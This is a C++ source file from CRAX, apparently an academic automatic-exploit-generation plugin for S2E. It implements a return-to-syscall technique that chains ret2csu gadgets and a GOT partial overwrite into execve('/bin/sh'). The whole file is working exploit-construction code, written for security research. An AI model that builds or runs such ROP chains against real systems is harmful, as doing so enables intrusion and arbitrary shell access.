// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Exploit.h>
#include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>

#include <cassert>
#include <vector>

#include "Ret2syscall.h"

namespace s2e::plugins::crax {

Ret2syscall::Ret2syscall()
    : Technique(),
      m_syscallGadget() {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    const std::string gadgetAsm = "syscall ; ret";

    if (exploit.resolveGadget(elf, gadgetAsm)) {
        m_requiredGadgets.push_back(std::make_pair(&elf, gadgetAsm));
        m_syscallGadget = BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(gadgetAsm));

    } else if (!elf.checksec.hasFullRELRO &&
               elf.symbols().find("read") != elf.symbols().end()) {
        m_syscallGadget = BaseOffsetExpr::create<BaseType::SYM>(elf, "read");
    }
}


bool Ret2syscall::checkRequirements() const {
    return Technique::checkRequirements() && m_syscallGadget;
}

std::vector<RopSubchain> Ret2syscall::getRopSubchains() const {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    auto ret2csu = g_crax->getTechnique<Ret2csu>();
    assert(ret2csu);

    // read(0, elf.got['read'], 1), setting RAX to 1.
    RopSubchain part1 = ret2csu->getRopSubchains(
        m_syscallGadget,
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::GOT>(elf, "read"),
        ConstantExpr::create(1, Expr::Int64))[0];

    // syscall<1>(1, 0, 0), setting RAX to 0.
    RopSubchain part2 = ret2csu->getRopSubchains(
        m_syscallGadget,
        ConstantExpr::create(1, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64))[0];

    // syscall<0>(0, elf.bss(), 59),
    // reading "/bin/sh".ljust(59, b'\x00') to elf.bss()
    RopSubchain part3 = ret2csu->getRopSubchains(
        m_syscallGadget,
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::BSS>(elf),
        ConstantExpr::create(59, Expr::Int64))[0];

    // syscall<59>("/bin/sh", 0, 0),
    // i.e. sys_execve("/bin/sh", NULL, NULL)
    RopSubchain part4 = ret2csu->getRopSubchains(
        m_syscallGadget,
        BaseOffsetExpr::create<BaseType::BSS>(elf),
        ConstantExpr::create(0, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64))[0];

    RopSubchain ret1;
    RopSubchain ret2;
    RopSubchain ret3;

    ret1.reserve(1 + part1.size() + part2.size() + part3.size() + part4.size());
    ret1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
    ret1.insert(ret1.end(), part1.begin(), part1.end());
    ret1.insert(ret1.end(), part2.begin(), part2.end());
    ret1.insert(ret1.end(), part3.begin(), part3.end());
    ret1.insert(ret1.end(), part4.begin(), part4.end());
    ret2 = { ByteVectorExpr::create(std::vector<uint8_t> { getLsbOfReadSyscall() }) };
    ret3 = { ByteVectorExpr::create(ljust("/bin/sh", 59, 0x00)) };

    return { ret1, ret2, ret3 };
}

uint8_t Ret2syscall::getLsbOfReadSyscall() const {
    const ELF &libc = g_crax->getExploit().getLibc();

    // Get __read() info from libc.
    const Function &f = libc.functions().at("__read");

    std::vector<uint8_t> code(f.size);
    std::ifstream ifs(libc.getFilename(), std::ios::binary);
    ifs.seekg(f.address, std::ios::beg);
    ifs.read(reinterpret_cast<char*>(code.data()), f.size);

    uint64_t syscallOffset = -1;
    for (auto i : disas().disasm(code, f.address)) {
        if (i.mnemonic == "syscall") {
            syscallOffset = i.address;
            assert((syscallOffset & 0xff00) == (f.address & 0xff00));
            break;
        }
    }
    return syscallOffset & 0xff;
}

}  // namespace s2e::plugins::crax